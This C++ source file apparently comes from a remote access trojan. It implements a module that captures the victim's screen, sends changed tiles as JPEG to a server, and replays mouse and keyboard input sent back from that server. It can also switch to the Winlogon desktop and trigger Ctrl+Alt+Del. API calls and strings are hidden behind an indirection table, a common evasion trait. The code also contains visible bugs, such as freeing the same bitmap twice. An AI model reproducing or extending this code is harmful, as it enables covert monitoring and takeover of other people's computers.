// MyFrameTrans.cpp: implementation of the CMyFrameTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyFrameTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyFrameTrans::CMyFrameTrans()
{
	m_ImageCount = 50;

	m_FrameSize.cx = 0;
	m_FrameSize.cy = 0;
	m_PrevPoint.x = 0;
	m_PrevPoint.y = 0;

	dImageLen = 0;

	hCurBitmap = NULL;
	hBufBitmap = NULL;

	pSendPoint = NULL;
	pImagePoint = NULL;
	nImageCount = 0;
	nSendCount = 0;

	xImageCount = 0;
	yImageCount = 0;

	hSendDataEvent = m_gFunc.CreateEvent(NULL, TRUE, FALSE, NULL);
	hSendDataMetux = m_gFunc.CreateMutex(NULL, FALSE, NULL);

	m_IsFrameExit = FALSE;

	pBakImageData = NULL;
	pCurImageData = NULL;

	nLineBitLenDouble = 0;
	nLineBitLen = 0;

	pZipData = NULL;

	m_gFunc.memset(&m_BufBitmapInfo, 0, sizeof(BITMAPINFO));
	m_gFunc.memset(&m_BitmapInfo, 0, sizeof(BITMAPINFO));
}

CMyFrameTrans::~CMyFrameTrans()
{
	m_gFunc.CloseHandle(hSendDataEvent);
	m_gFunc.CloseHandle(hSendDataMetux);

	if(pBakImageData != NULL)
	{
		delete [] pBakImageData;
	}

	if(pCurImageData != NULL)
	{
		delete [] pCurImageData;
	}

	if(pSendPoint != NULL)
	{
		delete [] pSendPoint;
	}

	if(pImagePoint != NULL)
	{
		delete [] pImagePoint;
	}

	if(hBufBitmap != NULL)
	{
		m_gFunc.DeleteObject(hBufBitmap);
	}

	if(hCurBitmap != NULL)
	{
		m_gFunc.DeleteObject(hCurBitmap);
	}

	if(hTmpBitmap != NULL)
	{
		m_gFunc.DeleteObject(hCurBitmap);
	}

	if(pStmBmp != NULL) 
	{
		pStmBmp->Release();
	}

	if(hMemBmp != NULL)	
	{
		m_gFunc.GlobalFree(hMemBmp);
	}
}

void CMyFrameTrans::SendImage()
{
	while(1)
	{
		m_gFunc.WaitForSingleObject(hSendDataEvent, 0xffffffff);
		m_gFunc.ResetEvent(hSendDataEvent);
		m_gFunc.WaitForSingleObject(hSendDataMetux, 0xffffffff);
		if(!SendData(&nSendCount, sizeof(DWORD)) || !SendData(pSendPoint, nSendCount * sizeof(PSPOINT))
			|| !SendData(&len.LowPart, sizeof(DWORD)) || !SendData(pZipData, len.LowPart))
		{
			m_gFunc.ReleaseMutex(hSendDataMetux);
			break;
		}
		m_gFunc.ReleaseMutex(hSendDataMetux);
	}
	m_IsFrameExit = TRUE;
}

DWORD CMyFrameTrans::SendThread(LPVOID lPvoid)
{
	m_gFunc.SetThreadAffinityMask(m_gFunc.GetCurrentThread(), 0x0e);
	CMyFrameTrans* pThis = (CMyFrameTrans*) lPvoid;
	pThis->SendImage();
	return 0;
}

void CMyFrameTrans::GetFrameDataForSend()
{
	long l = nLineBitLenDouble / sizeof(long) / 2;
	long l2 = nLineBitLenDouble * 2;

	//DISPLAY
	char m_DisplayStr[256] = {0};
	m_gFunc.GetMyString(10275, m_DisplayStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//开始循环发送屏幕数据
	while(!m_IsFrameExit)
	{
		//拷贝当前屏幕
		HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
		HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			m_gFunc.SetThreadDesktop(hNewDesktop);
		}

		HDC hSrcDC = m_gFunc.CreateDC(m_DisplayStr, NULL, NULL, NULL);
		HDC hCurDC = m_gFunc.CreateCompatibleDC(hSrcDC);
		m_gFunc.SelectObject(hCurDC, hCurBitmap);
		m_gFunc.BitBlt(hCurDC, 0, 0, m_FrameSize.cx, m_FrameSize.cy, hSrcDC, 0, 0, SRCCOPY);
		m_gFunc.DeleteDC(hSrcDC);
			
		HDC hBufDC = m_gFunc.CreateCompatibleDC(hCurDC);
		m_gFunc.SelectObject(hBufDC, hBufBitmap);

		HDC hTmpDC = m_gFunc.CreateCompatibleDC(hCurDC);
		m_gFunc.SelectObject(hTmpDC, hTmpBitmap);
		LPBYTE pOldImagePoint = pBakImageData;

		//取当前改变画面
		for(register int y = 0; y < yImageCount; y++)
		{
			for(register int x = 0; x < xImageCount; x++)
			{
				//取当前块内容
				m_gFunc.BitBlt(hTmpDC, 0, 0, P_I_C, P_I_C, hCurDC, x * P_I_C, y * P_I_C, SRCCOPY);
				
				//取当前块图象数据
				m_gFunc.GetDIBits(hTmpDC, hTmpBitmap, 0, P_I_C, pCurImageData, &m_BitmapInfo, DIB_RGB_COLORS);

				long* s = (long*) pCurImageData;
				long* d = (long*) pOldImagePoint;
				long i = m_BitmapInfo.bmiHeader.biHeight - x % 2;

				do
				{
					__asm
					{
						mov ebx, s
						mov edx, d
						mov ecx, l
					}

				xxx:
					__asm
					{
						mov eax, [ebx + ecx * 8 - 4]
						xor eax, [edx + ecx * 8 - 4]
						je yyy
					}

					// Diff
					m_gFunc.memcpy(pOldImagePoint, pCurImageData, m_BitmapInfo.bmiHeader.biSizeImage);
					m_gFunc.BitBlt(hBufDC, nImageCount * P_I_C, 0, P_I_C, P_I_C, hTmpDC, 0, 0, SRCCOPY);
					pImagePoint[nImageCount].x = x * P_I_C;
					pImagePoint[nImageCount].y = y * P_I_C;
					nImageCount ++;
					break;

				yyy:
				   // Same
					__asm
					{
						dec ecx
						jnz xxx
					}

					*(long *)&s += l2;
					*(long *)&d += l2;

				}while((i -= 2) > 0);
				pOldImagePoint += m_BitmapInfo.bmiHeader.biSizeImage;
			}
		}
		m_gFunc.DeleteDC(hCurDC);
		m_gFunc.DeleteDC(hTmpDC);

		if(nImageCount > 0)
		{
			HBITMAP hDesBitmap = m_gFunc.CreateCompatibleBitmap(hBufDC, nImageCount * P_I_C, P_I_C);
			HDC hDesDC = m_gFunc.CreateCompatibleDC(hBufDC);
			m_gFunc.SelectObject(hDesDC, hDesBitmap);
			m_gFunc.BitBlt(hDesDC, 0, 0, nImageCount * P_I_C, P_I_C, hBufDC, 0, 0, SRCCOPY);
			m_gFunc.DeleteDC(hBufDC);
			m_gFunc.DeleteDC(hDesDC);

			if(m_gFunc.WaitForSingleObject(hSendDataMetux, 0xffffffff) == WAIT_OBJECT_0)
			{
				len.QuadPart = 0;
				pos.QuadPart = 0;
				pStmBmp->Seek(pos, STREAM_SEEK_SET, &len);
				Bitmap* pTmpBitmap = Bitmap::FromHBITMAP(hDesBitmap, NULL);
				pTmpBitmap->Save(pStmBmp, &eClsid, &eParameters);
				delete pTmpBitmap;
				m_gFunc.DeleteObject(hDesBitmap);
				len.QuadPart = 0;
				pos.QuadPart = 0;
				pStmBmp->Seek(pos, STREAM_SEEK_CUR, &len);

				nSendCount = nImageCount;
				m_gFunc.memcpy(pSendPoint, pImagePoint, sizeof(PSPOINT) * nSendCount);
				m_gFunc.ReleaseMutex(hSendDataMetux);
			}
			m_gFunc.SetEvent(hSendDataEvent);
			nImageCount = 0;
		}
		else
		{
			m_gFunc.DeleteDC(hBufDC);
		}
		m_gFunc.SetThreadDesktop(hOldDesktop);
		m_gFunc.Sleep(50);
	}
}

BOOL CMyFrameTrans::StartWork(HWND hWnd)
{
	ULONG_PTR gdiplusToken = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	m_gFunc.GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	//连接到服务器
	if(!Create(WM_CONNECT_FRAM, hWnd))
	{
		return FALSE;
	}

	HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
	HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		m_gFunc.SetThreadDesktop(hNewDesktop);
	}

	//DISPLAY
	char m_DisplayStr[256] = {0};
	m_gFunc.GetMyString(10275, m_DisplayStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	HDC hSrcDC = m_gFunc.CreateDC(m_DisplayStr, NULL, NULL, NULL);

	//取屏幕分辨率
	m_FrameSize.cx = m_gFunc.GetDeviceCaps(hSrcDC, HORZRES);
	m_FrameSize.cy = m_gFunc.GetDeviceCaps(hSrcDC, VERTRES);
	DWORD nColor = m_gFunc.GetDeviceCaps(hSrcDC, BITSPIXEL);

	if(m_FrameSize.cx % P_I_C == 0)
	{
		xImageCount = m_FrameSize.cx / P_I_C;
	}
	else
	{
		xImageCount = m_FrameSize.cx / P_I_C + 1;
	}

	if(m_FrameSize.cy % P_I_C == 0)
	{
		yImageCount = m_FrameSize.cy / P_I_C;
	}
	else
	{
		yImageCount = m_FrameSize.cy / P_I_C + 1;
	}
	pSendPoint = new PSPOINT[xImageCount * yImageCount];
	pImagePoint = new PSPOINT[xImageCount * yImageCount];
	
	hCurBitmap = m_gFunc.CreateCompatibleBitmap(hSrcDC, m_FrameSize.cx, m_FrameSize.cy);
	hBufBitmap = m_gFunc.CreateCompatibleBitmap(hSrcDC, xImageCount * yImageCount * P_I_C, P_I_C);
	hTmpBitmap = m_gFunc.CreateCompatibleBitmap(hSrcDC, P_I_C, P_I_C);
	
	m_BitmapInfo.bmiHeader.biSize			= sizeof(BITMAPINFOHEADER);
	m_BitmapInfo.bmiHeader.biWidth			= P_I_C;
	m_BitmapInfo.bmiHeader.biHeight			= P_I_C;
	m_BitmapInfo.bmiHeader.biPlanes			= 1;
	m_BitmapInfo.bmiHeader.biBitCount		= (WORD) nColor;
	m_BitmapInfo.bmiHeader.biCompression	= BI_RGB;
	m_gFunc.GetDIBits(hSrcDC, hTmpBitmap, 0, P_I_C, NULL, &m_BitmapInfo, DIB_RGB_COLORS);
	nLineBitLenDouble = m_BitmapInfo.bmiHeader.biSizeImage / P_I_C;
	nLineBitLen = nLineBitLenDouble / 2;
	m_gFunc.memcpy(&m_BufBitmapInfo, &m_BitmapInfo, sizeof(BITMAPINFO));

	//压缩缓冲参数
	hMemBmp = m_gFunc.GlobalAlloc(GMEM_FIXED, m_BitmapInfo.bmiHeader.biSizeImage * xImageCount * yImageCount);
	m_gFunc.CreateStreamOnHGlobal(hMemBmp, FALSE, &pStmBmp);
	len.LowPart = m_BitmapInfo.bmiHeader.biSizeImage * xImageCount * yImageCount;
	pStmBmp->SetSize(len);
	pZipData = (BYTE*) m_gFunc.GlobalLock(hMemBmp);

	pBakImageData = new BYTE[xImageCount * yImageCount * m_BitmapInfo.bmiHeader.biSizeImage];
	m_gFunc.memset(pBakImageData, 0, xImageCount * yImageCount * m_BitmapInfo.bmiHeader.biSizeImage);
	pCurImageData = new BYTE[m_BitmapInfo.bmiHeader.biSizeImage];
	m_gFunc.memset(pCurImageData, 0, m_BitmapInfo.bmiHeader.biSizeImage);

	//取当前屏幕拷贝
	HDC hCurDC = m_gFunc.CreateCompatibleDC(hSrcDC);
	m_gFunc.SelectObject(hCurDC, hCurBitmap);
	m_gFunc.BitBlt(hCurDC, 0, 0, m_FrameSize.cx, m_FrameSize.cy, hSrcDC, 0, 0, SRCCOPY);
	m_gFunc.DeleteDC(hSrcDC);

	HDC hTmpDC = m_gFunc.CreateCompatibleDC(hCurDC);
	m_gFunc.SelectObject(hTmpDC, hTmpBitmap);
	LPBYTE pOldImageData = pBakImageData;
	for(int y = 0; y < yImageCount; y++)
	{
		for(int x = 0; x < xImageCount; x++)
		{
			m_gFunc.BitBlt(hTmpDC, 0, 0, P_I_C, P_I_C, hCurDC, x * P_I_C, y * P_I_C, SRCCOPY);
			m_gFunc.GetDIBits(hTmpDC, hTmpBitmap, 0, P_I_C, pOldImageData, &m_BitmapInfo, DIB_RGB_COLORS);
			pOldImageData += m_BitmapInfo.bmiHeader.biSizeImage;
		}
	}
	m_gFunc.DeleteDC(hCurDC);
	m_gFunc.DeleteDC(hTmpDC);
	m_gFunc.SetThreadDesktop(hOldDesktop);

	//接收初始化数据
	MYFRAMEINFO m_Info = {0};
	m_Info.m_Width = (WORD) m_FrameSize.cx;
	m_Info.m_Height = (WORD) m_FrameSize.cy;
	m_Info.m_RectSize = P_I_C;
	if(!SendData(&m_Info, sizeof(MYFRAMEINFO)))
	{
		return FALSE;
	}

	//image/jpeg
	char m_aImageStr[256] = {0};
	m_gFunc.GetMyString(10276, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	WCHAR m_wImageStr[256] = {0};
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);

	//压缩图象参数
	MyMainFunc::GetEncoderClsid(m_wImageStr, &eClsid);
	eParameters.Count = 1;
	eParameters.Parameter[0].Guid = EncoderQuality;
	eParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	eParameters.Parameter[0].NumberOfValues = 1;
	eParameters.Parameter[0].Value = &m_ImageCount;

	//压缩图象
	len.QuadPart = 0;
	pos.QuadPart = 0;
	pStmBmp->Seek(pos, STREAM_SEEK_SET, &len);
	Bitmap* pTmpBitmap = Bitmap::FromHBITMAP(hCurBitmap, NULL);
	pTmpBitmap->Save(pStmBmp, &eClsid, &eParameters);
	delete pTmpBitmap;
	len.QuadPart = 0;
	pos.QuadPart = 0;
	pStmBmp->Seek(pos, STREAM_SEEK_CUR, &len);
	if(!SendData(&len.LowPart, sizeof(DWORD)) || !SendData(pZipData, len.LowPart))
	{
		return FALSE;
	}

	HANDLE hThreadRecv = (HANDLE) m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) RecvThread, (LPVOID) this, 0, NULL);
	HANDLE hThreadSend = (HANDLE) m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) SendThread, (LPVOID) this, 0, NULL);
	
	m_gFunc.SetThreadAffinityMask(m_gFunc.GetCurrentThread(), 0x01);
	m_gFunc.SetThreadAffinityMask(hThreadSend, 0x0e);
	m_gFunc.SetThreadAffinityMask(hThreadRecv, 0x0e);

	//取数据发送
	GetFrameDataForSend();

	//关闭套接字
	Close();

	m_gFunc.WaitForSingleObject(hThreadRecv, 1000);
	m_gFunc.WaitForSingleObject(hThreadSend, 1000);
	return TRUE;
}

void CMyFrameTrans::RecvCmd()
{
	MOUSEINFO m_MouseInfo = {0};
	while(1)
	{
		HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
		HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			m_gFunc.SetThreadDesktop(hNewDesktop);
		}
		if(!RecvData(&m_MouseInfo, sizeof(MOUSEINFO)))
		{
			break;
		}
		if(m_MouseInfo.cmd == CMD_FRAME_MOUSE_STATE)
		{
			MoveCursor(&m_MouseInfo);
		}
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_STATE)
		{
			HitKeyState(&m_MouseInfo);
		}
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_ALL)
		{
			m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) SendLogonInfoThread, (LPVOID) this, 0, NULL);
		}
		m_gFunc.SetThreadDesktop(hOldDesktop);
	}
	m_IsFrameExit = TRUE;
}

DWORD CMyFrameTrans::RecvThread(LPVOID lPvoid)
{
	CMyFrameTrans* pThis = (CMyFrameTrans*) lPvoid;
	pThis->RecvCmd();
	return 0;
}

inline void CMyFrameTrans::MoveCursor(LPMOUSEINFO pInfo)
{
	POINT Point;
	Point.x = pInfo->x;
	Point.y = pInfo->y;
	if(pInfo->state == MOUSEEVENTF_MOVE)
	{
		if(m_PrevPoint.x != 0 && m_PrevPoint.y != 0)
		{
			Point.x = (m_PrevPoint.x - pInfo->x) > 0 ? (m_PrevPoint.x - pInfo->x) : (pInfo->x - m_PrevPoint.x);
			Point.y = (m_PrevPoint.y - pInfo->y) > 0 ? (m_PrevPoint.y - pInfo->y) : (pInfo->y - m_PrevPoint.y);
			m_PrevPoint.x = pInfo->x;
			m_PrevPoint.y = pInfo->y;
		}
		else
		{
			m_PrevPoint = Point;
		}
	}
	INPUT m_InPut = {0};
	m_InPut.mi.dx = Point.x;
	m_InPut.mi.dy = Point.y;
	m_InPut.mi.dwFlags = pInfo->state;
	m_InPut.type = INPUT_MOUSE;
	m_gFunc.SetCursorPos(pInfo->x, pInfo->y);
	m_gFunc.SendInput(1, &m_InPut,sizeof(m_InPut));
}

inline void CMyFrameTrans::TypeKey(BYTE vk, DWORD dwFlag)
{
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = vk;
	input.ki.wScan = vk;
	input.ki.dwFlags = dwFlag;
	input.ki.dwExtraInfo = NULL;
	input.ki.time = 0;
	m_gFunc.SendInput(1, &input, sizeof(input));
}

inline void CMyFrameTrans::HitKeyState(LPMOUSEINFO pInfo)
{
	if(pInfo->x)
	{
		TypeKey(VK_SHIFT, 0);
	}
	else
	{
		TypeKey(VK_SHIFT, KEYEVENTF_KEYUP);
	}
	if(pInfo->y)
	{
		TypeKey(VK_CONTROL, 0);
	}
	else
	{
		TypeKey(VK_CONTROL, KEYEVENTF_KEYUP);
	}
	if(pInfo->state)
	{
		TypeKey(VK_MENU, 0);
	}
	else
	{
		TypeKey(VK_MENU, KEYEVENTF_KEYUP);
	}
	TypeKey(pInfo->ch, 0);
	TypeKey(pInfo->ch, KEYEVENTF_KEYUP);
}

DWORD CMyFrameTrans::SendLogonInfoThread(LPVOID lPvoid)
{
	//Winlogon
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10257, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
	HDESK hNewDesktop = m_gFunc.OpenDesktop(m_TmpStr, 0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		m_gFunc.SetThreadDesktop(hNewDesktop);
	}
	m_gFunc.PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	m_gFunc.SetThreadDesktop(hOldDesktop);
	return 0;
}

